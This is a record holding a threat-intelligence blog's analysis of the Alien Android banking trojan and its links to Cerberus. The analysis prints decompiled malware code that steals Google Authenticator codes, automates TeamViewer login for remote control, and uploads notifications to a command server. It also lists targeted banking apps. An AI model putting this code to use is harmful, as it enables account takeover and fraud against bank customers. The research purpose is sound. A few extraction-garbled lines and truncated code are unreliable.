{
    "id": "692626d4-1746-47a4-b3c1-e40a5a29d4c5",
    "created_at": "2023-01-12T15:04:49.156868Z",
    "updated_at": "2025-03-27T02:16:25.634188Z",
    "deleted_at": null,
    "sha1_hash": "c3256121b06b7f2220dc336aea94f7bccf4f6074",
    "title": "2020-09-24 - Alien - the story of Cerberus' demise",
    "authors": "",
    "file_creation_date": "2022-05-28T23:39:31Z",
    "file_modification_date": "2022-05-28T23:39:31Z",
    "file_size": 860813,
    "plain_text": "# Alien - the story of Cerberus' demise\n\n**threatfabric.com/blogs/alien_the_story_of_cerberus_demise.html**\n\nSeptember 2020\n\n## Intro\n\n[As predicted in our blog 2020 – year of the RAT, 2020 has been an effervescent year for financially motivated threat actors making use of](https://www.threatfabric.com/blogs/2020_year_of_the_rat.html)\nAndroid malware. Although the ThreatFabric team discovered several new banking Trojans, it also observed the death of some others. Threat\nactors continue to innovate and try out new ways to steal and monetize personal information. In some cases, actors are successful, with longrunning campaigns powered by their malware, in other cases, they are fruitless, resulting in the downfall of their malware, as quickly as it\n\n\n-----\n\nappea ed t s b og, e desc be a e at e y e a d ba e y o d o d ba g oja t e ote ccess oja, ot cat o stea g\nand authenticator-based 2FA theft capabilities, dubbed Alien, and explain how it relates to infamous Cerberus malware, who’s service has\nrecently been discontinued.\n\n## The preface, Cerberus\n\nAugust 2020 marked the demise of Cerberus, the most successful Android banking Trojan service, or MaaS (Malware as a Service), of the last\n[12 months. Details about the Trojan can be found in our blog about from August last year. Apparently due to issues related to shortcomings of](https://www.threatfabric.com/blogs/cerberus-a-new-banking-trojan-from-the-underworld.html)\nthe staff within the threat actor’s technical team, architectural and technical issues with the Trojan remained unsolved long enough for Google\nPlay Protect to detect all related samples on the spot on all infected devices, of course resulting in unhappy customers.\n\nAt the end of July, because of these issues, the actor behind Cerberus tried to sell the service, including the customer portfolio, in the hopes\nanother actor would continue his work. Our telemetry, as seen in the graph below, shows a steady decrease of new Cerberus samples starting\nfrom this moment.\n\nAfter a series of customer complaints and due to his fruitless attempts to sell the source code of the Trojan as a whole, the owner of the\nmalware finally decided to end the rental service and refund active license holders. On August 10th 2020 he shared the source code of\nCerberus with the administrator of the underground forum in which he was renting it out. As we forecasted, shortly after, the source code of the\nTrojan became available to the general public.\n\nYou might wonder why the number of samples drops and barely increases again despite the source code being publicly available. There are\ntwo reasons: firstly, actors who got their hands on the code need to understand how to setup the backend (C2) and builder, secondly the actors\nwhich successfully built samples noticed that their payload is immediately detected by Play Protect when installed on an Android device and\ntherefore are now probably working on rearranging the code (resulting in their own code fork). All samples detected since the official Cerberus\nservice interruption are test samples and no large-scale or successful campaign has been observed so far. However, since Cerberus was such\na successful malware, it is likely that other actors will start using it actively once its issues are resolved, therefore we can expect it to resurface\nat any time.\n\nDespite Cerberus not being actively rented and supported any longer, we still often see some researchers reporting active Cerberus\ncampaigns. To explain why this happens we decided to write this blog and clear up any confusion: currently reported campaigns can be\nattributed to a fork of Cerberus, called “Alien”.\n\n## Behind the scenes\n\nOur story starts on January 2020, when our analyst team first spotted something which at first glance could have been considered a new\nversion of Cerberus. In those newly found samples the authors revisited the C2 communication protocol, added some new string protection\ntechniques, renamed the side-loaded module filename to bare his nickname and added the TeamViewer based RAT function.\n\nDespite some minor refactoring, the architecture of the Trojan stayed the same. At the same time, the Cerberus team was making\nannouncements about a soon-to-be-published second version of the Trojan in their commercial topic in an underground forum. Therefore, we\ninitially assumed that the samples discovered are in fact the first/test versions of that advertised new version of the Trojan and classified them\nas such. That held until 5 days later.\n\n### Enter the ring\n\nOn January 18th, we discovered an interesting new post from another actor in an underground forum. This actor, whose name matches the\nnewly introduced module name for the malware in question, started to advertise his own private malware with VNC feature.\n\n\n-----\n\nFor the sake of clarity: Although VNC (Virtual Network Computing) is a specific graphical desktop-sharing system, threat actors often label all\nTrojans with remote access capabilities (RAT) as embedding VNC, regardless of the technology being used.\n\nThis discovery also matched the fact that the newly found samples included the RAT feature, making use of TeamViewer to provide remote\naccess to the infected device.\n\nThe highly relatable codebase, showing the strong links between this new Trojan and Cerberus was conflicting with the fact that this Trojan\nwas clearly operated by a separate group, therefore we decide to investigate the situation further. Luckily, it was only a matter of weeks before\nwe could confirm what was going on.\n\n### Meet the Duke\n\nIn February, it became apparent that the new malware was operated separately and slightly differently than Cerberus. We started to see\nsimultaneous campaigns using both Trojans. Additionally, the malware described by its apparent author was enriched by a 2FA stealing\ntechnique that was capable of stealing secret tokens from Google’s Authenticator application, while Cerberus didn’t have such a feature.\n\n[Mid-February, the actor who later proclaimed himself author of the BlackRock malware left a review on the profile of the apparent author,](https://www.threatfabric.com/blogs/blackrock_the_trojan_that_wanted_to_get_them_all.html)\nreviewing his malware-rental service:\n\nOn February 20th 2020, the Cerberus actors made a promotional post in their commercial topic that referenced researchers, sharing the\nsamples of what they thought was the Cerberus malware. Somewhat later, the BlackRock actor replied to the post, condemning the Cerberus\nactors for taking credit for another malware project, stating that it was a different malware that he uses himself:\n\n\n-----\n\nThoughtfully, he included some screenshots with proof:\n\n\n-----\n\nThe [tweet made by @pr3wtd that sparked that truly insightful conversation, clearly links provided IOCs with the sample of the malware that the](https://twitter.com/pr3wtd/status/1226927666080645122)\nBlackRock author was testing at the time, the Trojan advertised by the actor we already envisaged being author.\n\n\n-----\n\nThat sample indeed belongs to the same malware strain that we discovered earlier January.\n\n## The revelation\n\nAfter we established a solid link between the actor running the private rental service and the samples, the only aspect we were missing was\nthe name of the Trojan. Fortunately for us, after a while topics showing interest in a certain “Alien” malware started to appear in the\nunderground forum and the author himself confirmed his affiliation to, and the name of, the Trojan:\n\n[Based on our in-depth knowledge of the Trojan (available in our Mobile Threat Intelligence portal), we can prove that the Alien malware is a](https://www.threatfabric.com/mti.html)\nfork of the initial variant of Cerberus (v1), active since early January 2020 and rented out at the same time as Cerberus. Cerberus being\ndiscontinued, its customers seem to be switching to Alien, which has become the prominent new MaaS for fraudsters.\n\nLooking at what we know now about what happened with Cerberus and Alien, we could speculate that Cerberus was on the decline as the\ndevelopers behind the Trojan shifted away from the project with the original source in order to start their own. Interestingly enough, this\nspeculation is corroborated by the fact that when the second version of Cerberus (v2) was released in May 2020, it did not introduce any major\nnew features, except for the one to steal 2FA codes from Google’s authenticator app. The code of that feature code is almost identical to that\nintroduced with the Alien Trojan in February 2020. This indicates that at that time, the developer behind the Cerberus Trojan had access to,\nand might have been responsible for development of the Alien code.\n\nThe code of the Google Authenticator 2FA stealer of the Alien Trojan is visible in following snippet:\n\n\n-----\n\n```\n  try {\n    if(Build.VERSION.SDK_INT >= 18 && (currPackage.contains(\"com.google.android.apps.authenticator2\"))) {\n      A11yUtils.utils.log(\"run\", t\"com.google.android.apps.authenticator2\");\n      if(event.getSource() == null) {\n        return;\n      }\n      String athenticatorContent = \"\";\n      Iterator nodes = A11yUtils.getByMask(event.getSource(), \"android.view.ViewGroup\").iterator();\n      int idx = 0;\n      while(nodes.hasNext()) {\n        Object currObj = nodes.next();\n        AccessibilityNodeInfo currNode = (AccessibilityNodeInfo)currObj;\n        String local = athenticatorContent;\n        int idxCh;\n        for(idxCh = 0; idxCh < currNode.getChildCount(); ++idxCh) {\n          AccessibilityNodeInfo child = currNode.getChild(idxCh);\n          if(child.getText() != null) {\n            A11yUtils.utils.log(\"Line: \" + idx + \", index: \" + idxCh, child.getText().toString());\n            local = local + \"Line: \" + idx + \", index: \" + idxCh + \", text: \" + child.getText().toString() + \"\\\\n\";\n          }\n        }\n        ++idx;\n        athenticatorContent = local;\n      }\n      if(!athenticatorContent.isEmpty()) {\n        A11yUtils.utils.appendPrefs(serv, this.strings.AS, \"Logs com.google.android.apps.authenticator2: \\\\n\" +\nathenticatorContent + \"\\[143523#\\]\");\n        return;\n      }\n    }\n  }\n  catch(Exception unused_ex) {\n    return;\n  }\n}\n\n```\nThe code of the Google Authenticator 2FA stealer of the Cerberus Trojan is visible in following snippet:\n```\npublic void logAuthenticator(AccessibilityService parent, AccessibilityEvent event, String currentApp) { \n  try { \n    if(Build.VERSION.SDK_INT >= 18 && (currentApp.contains(\"com.google.android.apps.authenticator2\"))) { \n      this.log(\"run\", \"com.google.android.apps.authenticator2\"); \n      if(event.getSource() == null) { \n        return; \n      } \n      String logs = \"\"; \n      Iterator groupIter = Utils.getElemByMask(event.getSource(), \"android.view.ViewGroup\").iterator(); \n      int paramIdx = 0; \n      while(groupIter.hasNext()) { \n        Object groupObj = groupIter.next(); \n        AccessibilityNodeInfo group = (AccessibilityNodeInfo)groupObj; \n        String log = logs; \n        int idx; \n        for(idx = 0; idx \n< group.getChildCount(); ++idx) { \n            AccessibilityNodeInfo child = group.getChild(idx); \n            if(child.getText() != null) { \n              this.log(\"params1: \" + paramIdx + \", params2: \" + idx, child.getText().toString()); \n            log = log + \"params1: \" + paramIdx + \", params2: \" + idx + \", params3: \" + child.getText().toString() + \"\\\\n\n            } \n          } \n          ++paramIdx; \n          logs = log; \n        } \n        if(!logs.isEmpty()) { \n        this.appendShPr(parent, this.string.logTag, \"Logs com.google.android.apps.authenticator2: \\\\n\" + logs + this.string.\n        } \n      } \n    } \n  catch(Exception unused_ex) {\n  } \n}\n\n## The Alien malware\n\n```\n\n-----\n\ns desc bed p e ous sect o s, t e e a a e s a e ted ba g oja c o e s o e t a t e a e age capab t es o d o d\nbanking Trojans. It has common capabilities such as overlay attacks, control and steal SMS messages and harvest the contact list. It can\nleverage its keylogger for any use and therefore broaden the attack scope further than its target list. It also offers the possibility to install, start\nand remove applications from the infected device. Most importantly, it offers a notifications sniffer, allowing it to get the content of all\nnotifications on the infected device, and a RAT (Remote Access Trojan) feature (by abusing the TeamViewer application), meaning that the\nthreat actors can perform the fraud from the victim’s device.\n\nThe complete list of features of Alien is as follows:\n\nOverlaying: Dynamic (Local injects obtained from C2)\nKeylogging\nRemote access\nSMS harvesting: SMS listing\nSMS harvesting: SMS forwarding\nDevice info collection\nContact list collection\nApplication listing\nLocation collection\nOverlaying: Targets list update\nSMS: Sending\nCalls: USSD request making\nCalls: Call forwarding\nRemote actions: App installing\nRemote actions: App starting\nRemote actions: App removal\nRemote actions: Showing arbitrary web pages\nRemote actions: Screen-locking\nNotifications: Push notifications\nC2 Resilience: Auxiliary C2 list\nSelf-protection: Hiding the App icon\nSelf-protection: Preventing removal\nSelf-protection: Emulation-detection\nArchitecture: Modular\n\n## Differentiating between Alien and Cerberus\n\nWith two malware families originating from the same code base, we thought it would be useful for the community to be able to distinguish the\nTrojans. Distinction is the easiest by comparing the C2 protocols. The Alien C2 requests are built as follows:\n\nThe Cerberus C2 requests on the other hand look like this:\n\nBased on the same code, the two Trojans share most functionalities, but the Alien authors added two major features that are absent from both\nversions of Cerberus, respectively TeamViewer based remote control of the infected device and the notification sniffer (stealer).\n\n\n-----\n\n## The RAT\n\nOne of the most distinctive features of the Alien Trojan is its RAT capability. Authors chose to implement it separately from the main command\nhandler, therefore using different C2 endpoints.\n\nThe Alien RAT service implements the following set of commands:\n\n**Command** **Description**\n\nrat_disconnect Disables the RAT service\n\nopen_folder Lists files and subfolders in the specified folder\n\nuploadind_file Uploads the specified file to the C2\n\nconnect_teamviewer Provides credentials for the TeamViewer app and launches it\n\nopen_team_viewer Launches the TeamViewer app\n\nsend_settings Sends the current settings of RAT service to the C2\n\nget_apps Gets the list of installed applications on the infected device\n\nAfter using the Trojan’s commands to install additional apps on the device, TeamViewer is installed but not yet enabled. Once the actor\nprovides the credentials to set up the TeamViewer server connection, the Trojan uses the Accessibility privileges to access the TeamViewer\napplication, logs in using the provided credentials, grant any additional permissions it requires to run and dismiss any warnings issued (if\napplicable).\n\nThe following code snippet is handling those functions:\n\n\n-----\n\n```\n  if(Build.VERSION.SDK_INT >= 18) {\n    if(this.packageNameLow.contains(\"com.teamviewer.host.market\")) {\n      AccessibilityNodeInfo tvUsername = A11yUtils.getById(eventLocal, \"com.teamviewer.host.market:id/host\\_assign\\_device_use\n      AccessibilityNodeInfo tvPass = A11yUtils.getById(eventLocal, \"com.teamviewer.host.market:id/host\\_assign\\_device_passwor\n      AccessibilityNodeInfo tvSubmit = A11yUtils.getById(eventLocal, \"com.teamviewer.host.market:id/host\\_assign\\_device\\_subm\n      if(tvUsername != null) {\n        this.tvUser = this.utils.readPrefs(this, this.strings.RT);\n        if(!this.tvUser.isEmpty()) {\n          this.tvPass = this.utils.readPrefs(this, this.strings.RY);\n          this.isTvSubmitted = false;\n          this.isTvPassSet = false;\n          this.isTvUserSet = false;\n          this.tvStep = 0;\n          this.utils.writePrefs(this, this.strings.RT, \"\");\n          this.utils.writePrefs(this, this.strings.RY, \"\");\n        }\n      }\n      if(this.tvStep == 0 && (A11yUtils.getById(eventLocal, \"com.teamviewer.host.market:id/action\\_bar\\_root\") != null\n        && A11yUtils.getById(eventLocal, \"com.teamviewer.host.market:id/buttonPanel\") != null)) {\n        this.tvStep = 1;\n        AccessibilityNodeInfo btn1 = A11yUtils.getById(eventLocal, this.dec(\"android:id/button1\"));\n        if(btn1 != null) {\n          this.a11y.clickButton(btn1);\n        }\n        AccessibilityNodeInfo checkBox1 = A11yUtils.getById(eventLocal,\"com.samsung.klmsagent:id/checkBox1\");\n        AccessibilityNodeInfo btnConfirm = A11yUtils.getById(eventLocal, \"com.samsung.klmsagent:id/btn_confirm\");\n        if(checkBox1 != null && this.tvStep == 1) {\n          this.a11y.clickButton(checkBox1);\n          this.a11y.clickButton(btnConfirm);\n          this.tvStep = 2;\n          Utils.start(this, \"com.teamviewer.host.market\");\n        }\n      }\n      if(!this.tvUser.isEmpty() && !this.tvPass.isEmpty()) {\n        if(tvUsername != null && !this.isTvUserSet) {\n          A11yUtils.setText(tvUsername, this.tvUser);\n          this.isTvUserSet = true;\n        }\n        if(tvPass != null && !this.isTvPassSet) {\n          A11yUtils.setText(tvPass, this.tvPass);\n          this.isTvPassSet = true;\n        }\n        if((this.isTvUserSet) && (this.isTvPassSet) && !this.isTvSubmitted) {\n          this.tvStep = 0;\n          this.a11y.clickButton(tvSubmit);\n          this.isTvSubmitted = true;\n          if(this.utils.readPrefs(this, this.strings.RI).equals(\"true\")) {\n            this.backX2();\n          }\n        }\n      }\n    }\n    else if(this.packageNameLow.contains(\"com.samsung.klmsagent\")) {\n      AccessibilityNodeInfo checkBox2 = A11yUtils.getById(eventLocal, \"com.samsung.klmsagent:id/checkBox1\");\n      AccessibilityNodeInfo btnConfirm2 = A11yUtils.getById(eventLocal, \"com.samsung.klmsagent:id/btn_confirm\");\n      if(checkBox2 != null && this.tvStep == 1) {\n        this.a11y.clickButton(checkBox2);\n        this.a11y.clickButton(btnConfirm2);\n        this.tvStep = 2;\n        Utils.start(this, \"com.teamviewer.host.market\");\n      }\n    }\n    else {\n      this.tvStep = 0;\n    }\n    if((this.packageNameLow.contains(\"com.teamviewer.host.market\")) && (this.utils.readPrefs(this, this.strings.RA).equals(\"true\n      this.backX2();\n    }\n  }\n}\n\n```\n\n-----\n\n```\n}\n\n```\nWhen TeamViewer is successfully activated, it provides the actors with full remote control of the device’s user interface, enabling them to\naccess and change device settings, install and remove apps, but also to use any app installed on the device (bank applications, messengers\nand social networks). By monitoring the device in real-time, actors can also gain valuable insight into the user’s behavior.\n\nNote that although TeamViewer supports a wide range of device models, it does not guarantee a 100% coverage. On certain devices it only\nworks in screen streaming mode, only allowing the actors to see what happens on the screen without being able to interact with it.\n\n## Notification sniffer\n\nThe Trojan is abusing the android.permission.BIND_NOTIFICATION_LISTENER_SERVICE permission to get the content of status bar\nnotifications on the infected device. This permission is considered “risky”, which means that the user needs to grant it manually in the settings.\nMalware circumvents this countermeasure by using the Accessibility privileges, performing all necessary UI interaction by itself. After the\npermission is granted, the bot simply uploads notifications to the C2, as shown in the following snipped of code:\n```\n@Override // android.service.notification.NotificationListenerService\npublic void onNotificationPosted(StatusBarNotification arg4) {\n  try {\n    new NotificationHandler(this).sendNotification(new NotificationModel(arg4, true).toString());\n  }\n  catch(Exception v4) {\n    v4.printStackTrace();\n  }\n}\n@Override // android.service.notification.NotificationListenerService\npublic void onNotificationRemoved(StatusBarNotification arg2) {\n  try {\n    new NotificationHandler(this).process(arg2);\n  }\n  catch(Exception v2) {\n    v2.printStackTrace();\n  }\n}\n@Override // android.service.notification.NotificationListenerService\npublic void onNotificationRemoved(StatusBarNotification arg1, NotificationListenerService.RankingMap arg2, int arg3) {\n  try {\n    new NotificationHandler(this).process(arg1);\n  }\n  catch(Exception v1) {\n    v1.printStackTrace();\n  }\n}\n...\nfinal void process(StatusBarNotification arg3) {\n  this.sendNotification(new NotificationModel(arg3, false).toString());\n}\nfinal void sendNotification(String notification) {\n  Utils utils = new Utils();\n  Strings strings = new Strings();\n  String notificationText = this.dec(\"{Notification} \") + notification + this.dec(\"\\[143523#\\]\");\n  utils.log(this.dec(\"sendSMS\"), notificationText);\n  utils.appendShPr(this.ctx, strings.LOG, notificationText);\n  utils.sendLogs(this.ctx, utils.readShPr(this.ctx, strings.c2_handle));\n}\n\n## Targets\n\n```\nLooking at the targets (detailed in the appendix) and keeping in mind that all respective actors renting the Trojan can add their own\npersonalized targets to their botnet, we can consider that Alien is a Trojan actively targeting institutions worldwide.\n\nAs visible in the following chart, it seems that actors using Alien have a particular interest in the usual set of most targeted countries, such as\nbut not limited to Spain, Turkey, Germany, United States of America, Italy, France, Poland, Australia and the United Kingdom.\n\n\n-----\n\n## Conclusion\n\n[Once again, 2020 shows interesting changes to the mobile threat landscape. As stated in our blog 2020 – year of the RAT, not only is there an](https://www.threatfabric.com/blogs/2020_year_of_the_rat.html)\nincrease in the number of new Android banking Trojans, many of them also bring innovative features. More and more Trojans embed features\nthat enable the criminals to take remote control of the infected device (RAT) - like the Alien Trojan itself - in order to perform the fraud from the\nvictim’s device. We also notice an interest from actors in recording and stealing more information surrounding the victim. How that information\nwill be used or monetized can vary, it is just a matter of time before actors find out about the value of such information.\n\nIn the case of Alien, advanced features such as the authenticator-code stealer and notifications-sniffer aside, the features of the Trojan are\nquite common. As for many Trojans, the target list can be extended dynamically by the renter and applied to all bots enrolled to the botnet. The\ntargeted applications in the appendix of the article are the concatenated list of targets observed in samples found in the wild, growing to over\n226 targeted applications so far.\n\nAlthough it is hard to predict the next steps of the Alien authors, it would be logical for them to improve the RAT, which is currently based on\nTeamViewer (and therefore visible when installed and executed on the device). They could also build an ATS feature to automate the fraud\nprocess. What can be considered for granted is that the number of new banking Trojans will only continue growing, many embedding new and\nimproved features to increase the success rate of fraud.\n\nThe last quarter of 2020 will probably come with some additional changes to the threat landscape, especially since the source code of the\nCerberus Trojan has been made publicly available. In the coming months we can definitively expect some new malware families, based on\nCerberus, to emerge.\n\nThe most important aspect to take care of is securing the online banking channels, making fraud hard to perform, discouraging criminals to\nattempt the attacks and making it less useful for them to build more malware.\n\nWe strongly recommend all financial institutions to understand their current and future threat exposure and consequently implement the\nrelevant detection and control mechanisms. We are happy to support them in such steps with our expertise and solutions, built and tailored\nthrough the years we have been supporting banks in the fight against fraud.\n\n## Mobile Threat Intelligence\n\nOur threat intelligence solution – MTI, provides the context and in-depth knowledge of the past and present malware-powered threats in order\nto understand the future of the threat landscape. Such intelligence, includes both the strategic overview on trends and the operational\nindicators to discern early signals of upcoming threats and build a future-proof security strategy.\n\n## Client Side Detection\n\nOur online fraud detection solution – CSD, presents financial institutions with the real-time overview on the risk status of their online channels\nand related devices. This overview provides all the relevant information and context to act upon threats before they turn into fraud. The\nconnectivity with existing risk or fraud engines allows for automated and orchestrated, round the clock fraud mitigation.\n\n## Appendix\n\n### Samples\n\nSome of the latest Alien samples found in the wild:\n\n**App name** **Package name** **SHA-256 hash**\n\n\n-----\n\n**App name** **Package name** **SHA-256 hash**\n\nInPost gyciuhezywthjjmmchpkcr.ysa.pct 3e10f55451e1573ccf66aa2adc6b\n\nBildirim ldpgteqpernpguirqtltzsyegxj.edllabrcpucxwbbysloruoiaw.xmbzotblnfxjjbbatmnbluskpgw 163c2cff8cd941dbce727de2df9df\n\nFlash Player msqqqwokejyfwim.bzsotef.ftonpdptfkkfhcjxkrr dc215663af92d41f40f36088ec1b8\n\nDHL aciewtjnxbkcdxzhoabso.yhsxudbuwodnudkkrda.frlxqjezpmuisep df77910503d7fefae3915bb37245\n\ne-Devlet eglqpbffxahy.oefrmodhujop.tlk fd1d1e2dbca02997ce1905dc74f0\n\nMobdroTV jbx.roagjksrlsxsmknhdrizttgrhs.fbf ba625262b247e4c79e729a83f537\n\nAndroidUpdate11.18 okqfjhhtlohmgupciyhmoigta.fpt.yuddsjkkctjfmchocuqssqpiopy 342a9f13097e57efc2324b1db53f7\n\nFitness4Everybody sfga.yyh.mgufpnpnxowplrotzbig 4f1ff96fb54960d94e96fd60546040\n\nGoogle Update com.gvluzgxhbpcq.xktgujarlepo a3a285cdfb69e2ba600df8cc9d02\n\nInstall mnogftledxsehzfrsotw.wzwywztggscgfzmqyudxoql.snmewxuczyrzkocstclxtuqyohq 2b2d0dd04e272ea821c114a8366\n\n\nPlayer Sistem\nGüncelleme\n\n\nnjjmeghykw.okfhgnxldu.bncr 0b5e264d4bda3add9a8a4fcc61ce\n\n\nFitnessTrainer dwqzh.mqqzinsqzn.ezkxcyjhtraxqupzrrfyosasecw ded0e1e544cf5d2ec7a0c27400ee\n\n### Credential theft target list\n\nThe actual concatenated Alien target list used for credential theft contains 226 applications:\n\n**Package name** **App name**\n\ncom.coinbase.android Coinbase – Buy & Sell Bitcoin. Crypto Wallet\n\npiuk.blockchain.android Blockchain Wallet. Bitcoin, Bitcoin Cash, Ethereum\n\ncom.bbva.bbvacontigo BBVA Spain\n\ncom.bankinter.launcher Bankinter Móvil\n\nes.bancosantander.apps Santander\n\nes.univia.unicajamovil UnicajaMovil\n\nes.cm.android Bankia\n\nes.evobanco.bancamovil EVO Banco móvil\n\ncom.kutxabank.android Kutxabank\n\ncom.rsi ruralvía\n\ncom.akbank.android.apps.akbank_direkt Akbank\n\ncom.garanti.cepsubesi Garanti BBVA Mobile\n\ncom.finansbank.mobile.cepsube QNB Finansbank Mobile Banking\n\ncom.connectivityapps.hotmail Connect for Hotmail & Outlook: Mail and Calendar\n\ncom.teb CEPTETEB\n\ncom.ykb.android Yapı Kredi Mobile\n\nfinansbank.enpara Enpara.com Cep Şubesi\n\ncom.tmobtech.halkbank Halkbank Mobil\n\ncom.kuveytturk.mobil Kuveyt Türk\n\ncom.ziraat.ziraatmobil Ziraat Mobile\n\ncom.pozitron.iscep İşCep - Mobile Banking\n\ncom.vakifbank.mobile VakıfBank Mobil Bankacılık\n\nes.ibercaja.ibercajaapp Ibercaja\n\n\n-----\n\n**Package name** **App name**\n\ncom.abnamro.nl.mobile.payments ABN AMRO Mobiel Bankieren\n\npl.pkobp.iko IKO\n\npl.mbank mBank PL\n\npe.com.interbank.mobilebanking Interbank APP\n\njp.co.rakuten_bank.rakutenbank 楽天銀行 -個人のお客様向けアプリ\n\ncom.sbi.sbifreedomplus \nit.copergmps.rt.pf.android.sp.bmps Banca MPS\n\ncom.google.android.gm Gmail\n\ncom.mail.mobile.android.mail mail.com mail\n\nit.bnl.apps.banking BNL\n\nit.ingdirect.app ING Italia\n\ncom.yahoo.mobile.client.android.mail Yahoo Mail – Organized Email\n\ncom.db.mm.norisbank norisbank App\n\ncom.db.pbc.miabanca La Mia Banca\n\neu.unicreditgroup.hvbapptan HVB Mobile Banking\n\nde.commerzbanking.mobil Commerzbank Banking - The app at your side\n\nde.fiducia.smartphone.android.banking.vr VR Banking Classic\n\nde.postbank.finanzassistent Postbank Finanzassistent\n\ncom.targo_prod.bad TARGOBANK Mobile Banking\n\nde.comdirect.android comdirect mobile App\n\nde.dkb.portalapp DKB-Banking\n\ncom.starfinanz.smob.android.sfinanzstatus Sparkasse Ihre mobile Filiale\n\nde.consorsbank Consorsbank\n\ncom.finanteq.finance.ca CA24 Mobile\n\ncom.boursorama.android.clients Boursorama Banque\n\ncom.caisseepargne.android.mobilebanking Banque\n\ncom.cm_prod.bad Crédit Mutuel\n\ncom.ingdirectandroid \nfr.lcl.android.customerarea Mes Comptes - LCL\n\nfr.banquepopulaire.cyberplus Banque Populaire\n\nfr.creditagricole.androidapp Ma Banque\n\nmobi.societegenerale.mobile.lappli L’Appli Société Générale\n\nau.com.nab.mobile NAB Mobile Banking\n\ncom.cibc.android.mobi CIBC Mobile Banking®\n\ncom.grppl.android.shell.cmblloydstsb73 \ncom.grppl.android.shell.halifax Halifax: the banking app that gives you extra\n\norg.stgeorge.bank St.George Mobile Banking\n\ncom.att.mywireless \ncom.chase.sig.android Chase Mobile\n\n\n-----\n\n**Package name** **App name**\n\ncom.clairmail.fth Fifth Third Mobile Banking\n\ncom.csam.icici.bank.imobile iMobile by ICICI Bank\n\ncom.unicredit Mobile Banking UniCredit\n\nit.popso.scrignoapp \ncom.microsoft.office.outlook Microsoft Outlook: Organize Your Email & Calendar\n\ncom.infonow.bofa Bank of America Mobile Banking\n\ncom.konylabs.capitalone Capital One® Mobile\n\ncom.suntrust.mobilebanking SunTrust Mobile App\n\ncom.usaa.mobile.android.usaa USAA Mobile\n\ncom.usbank.mobilebanking U.S. Bank - Inspired by customers\n\ncom.wf.wellsfargomobile Wells Fargo Mobile\n\ncom.bmo.mobile BMO Mobile Banking\n\nit.nogood.container UBI Banca\n\ncom.rbc.mobile.android RBC Mobile\n\ncom.latuabancaperandroid Intesa Sanpaolo Mobile\n\ncom.ingbanktr.ingmobil ING Mobil\n\ncom.magiclick.odeabank Odeabank\n\nposteitaliane.posteapp.apppostepay Postepay\n\ntr.com.sekerbilisim.mbank ŞEKER MOBİL ŞUBE\n\ncom.commbank.netbank CommBank\n\ncom.android.vending Google Play\n\nes.liberbank.cajasturapp Banca Digital Liberbank\n\nwww.ingdirect.nativeframe ING España. Banca Móvil\n\ncom.cajasur.android Cajasur\n\ncom.tecnocom.cajalaboral Banca Móvil Laboral Kutxa\n\ncom.db.pbc.mibanco Mi Banco db\n\nnet.inverline.bancosabadell.officelocator.android Banco Sabadell App. Your mobile bank\n\ncom.bbva.netcash BBVA Net Cash | ES & PT\n\nes.bancosantander.empresas Santander Empresas\n\ncom.paypal.android.p2pmobile PayPal Mobile Cash: Send and Request Money Fast\n\npl.bzwbk.bzwbk24 Santander mobile\n\nes.caixageral.caixageralapp Banco Caixa Geral España\n\nalior.bankingapp.android Usługi Bankowe\n\neu.eleader.mobilebanking.pekao Pekao24Makler\n\neu.eleader.mobilebanking.pekao.firm PekaoBiznes24\n\ncom.facebook.katana Facebook\n\ncom.imaginbank.app imaginBank - Your mobile bank\n\ncom.whatsapp WhatsApp Messenger\n\ncom.snapchat.android Snapchat\n\n\n-----\n\n**Package name** **App name**\n\ncom.twitter.android Twitter\n\norg.telegram.messenger Telegram\n\ncom.instagram.android Instagram\n\ncom.viber.voip Viber Messenger - Messages, Group Chats & Calls\n\nes.lacaixa.mobile.android.newwapicon CaixaBank\n\nsoftax.pekao.powerpay PeoPay\n\ncom.ebay.mobile eBay: Buy, sell, and save money on home essentials\n\ncom.amazon.mshop.android.shopping \ncom.getingroup.mobilebanking Getin Mobile\n\nwit.android.bcpbankingapp.millenniumpl \ncom.konylabs.cbplpat Citi Handlowy\n\nes.caixagalicia.activamovil ABANCA- Banca Móvil\n\ncom.moneybookers.skrillpayments.neteller NETELLER - fast, secure and global money transfers\n\ncom.pcfinancial.mobile Simplii Financial\n\ncom.td TD Canada\n\ncz.csob.smartbanking ČSOB Smartbanking\n\ncom.airbitz Bitcoin Wallet - Airbitz\n\nclientapp.swiftcom.org ePayments: wallet & bank card\n\nde.number26.android N26 — The Mobile Bank\n\nau.com.ingdirect.android ING Australia Banking\n\ncom.payoneer.android Payoneer – Global Payments Platform for Businesses\n\ncom.cimbmalaysia CIMB Clicks Malaysia\n\neu.eleader.mobilebanking.invest plusbank24\n\ncom.moneybookers.skrillpayments Skrill - Fast, secure online payments\n\ncom.mycelium.wallet Mycelium Bitcoin Wallet\n\nuk.co.santander.santanderuk \ncom.aff.otpdirekt OTP SmartBank\n\ncom.kasikorn.retail.mbanking.wap K PLUS\n\ncom.krungsri.kma KMA\n\ncom.scb.phone SCB EASY\n\ncom.netflix.mediaclient Netflix\n\ncom.bendigobank.mobile Bendigo Bank\n\ncom.citibank.citibankmy \ncom.konylabs.hongleongconnect \norg.banksa.bank BankSA Mobile Banking\n\norg.bom.bank Bank of Melbourne Mobile Banking\n\nat.volksbank.volksbankmobile Volksbank hausbanking\n\nnet.bnpparibas.mescomptes Mes Comptes BNP Paribas\n\ncom.ocito.cdn.activity.creditdunord Crédit du Nord pour Mobile\n\n\n-----\n\n**Package name** **App name**\n\npl.bph BusinessPro Lite\n\npt.bancobpi.mobile.fiabilizacao BPI APP\n\npt.novobanco.nbapp NB smart app\n\npt.santandertotta.mobileparticulares Santander Particulares\n\ncom.bankofqueensland.boq BOQ Mobile\n\nfr.laposte.lapostemobile La Poste - Services Postaux\n\ncom.cic_prod.bad CIC\n\ncom.fortuneo.android Fortuneo, mes comptes banque & bourse en ligne\n\nnz.co.asb.asbmobile ASB Mobile Banking\n\npl.bzwbk.ibiznes24 iBiznes24 mobile\n\npl.millennium.corpapp \nnet.garagecoders.e_llavescotiainfo ScotiaMóvil\n\ncom.credemmobile \nit.carige Carige Mobile\n\neu.inmite.prj.kb.mobilbank Mobilni Banka\n\njp.co.netbk 住信SBIネット銀行\n\nau.com.cua.mb CUA Mobile Banking\n\ncom.advantage.raiffeisenbank \ncom.bankaustria.android.olb Bank Austria MobileBanking\n\ncom.barclays.android.barclaysmobilebanking Barclays\n\ncom.bochk.com BOCHK\n\ncom.htsu.hsbcpersonalbanking HSBC Mobile Banking\n\ncom.anz.android.gomoney ANZ Australia\n\ncom.bankia.wallet Bankia Wallet\n\ncom.fusion.banking 